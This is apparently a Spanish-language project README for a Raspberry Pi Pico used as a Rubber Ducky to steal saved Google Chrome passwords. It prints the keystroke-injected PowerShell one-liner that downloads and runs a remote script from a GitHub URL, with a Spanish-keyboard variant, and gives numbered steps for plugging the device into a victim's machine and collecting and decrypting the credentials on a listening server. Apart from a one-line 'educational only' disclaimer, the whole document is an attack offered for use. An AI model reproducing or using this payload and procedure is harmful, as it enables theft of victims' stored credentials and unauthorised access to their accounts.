🛑 Robo de Credenciales Guardadas en Chrome con Raspberry Pi Pico
Este proyecto demuestra cómo una Raspberry Pi Pico puede actuar como un Rubber Ducky para extraer credenciales almacenadas en Google Chrome, enviándolas a un servidor local para su desencriptado con Python.

⚠️ Este contenido es únicamente educativo. No me hago responsable del uso indebido.

📌 Archivos y estructura del proyecto
1️. Script inyectado por el Rubber Ducky (ininit.ps1)
Dentro del archivo payload.dd, se ejecutará el siguiente comando:

🔹 Distribución en inglés (ENG)
STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jndr332/RubberPico/refs/heads/main/ininit.ps1").Content

🔹 Distribución en español (ESP)
STRING Invoke/Expression *Invoke/WebRequest /Uri @https>&&raw.githubusercontent.com&jndr332&RubberPico&refs&heads&main&ininit.ps1@(.Content

📝 Nota: Dependiendo de la distribución del teclado, algunos caracteres pueden diferir. Aquí tienes opciones para español e inglés.

2.  Archivos en el servidor
El servidor recibe los datos extraídos y los desencripta con Python. Los archivos clave son:

📌 server.py → Escucha las conexiones y recibe las credenciales.
📌 decipher.py → Se encarga del desencriptado de las contraseñas.

💡 Recuerda ejecutar server.py antes de iniciar el ataque, para asegurarte de que el servidor esté escuchando correctamente.



¿Cómo Usarlo?
1️⃣ Configura tu Raspberry Pi Pico como Rubber Ducky.
2️⃣ Carga el payload (payload.dd) en el Pi Pico.
3️⃣ Inicia server.py en tu máquina receptora.
4️⃣ Conecta la Raspberry Pi Pico a la máquina víctima y espera la ejecución.
5️⃣ Las credenciales extraídas se recibirán en el servidor y se descifrarán con decipher.py.

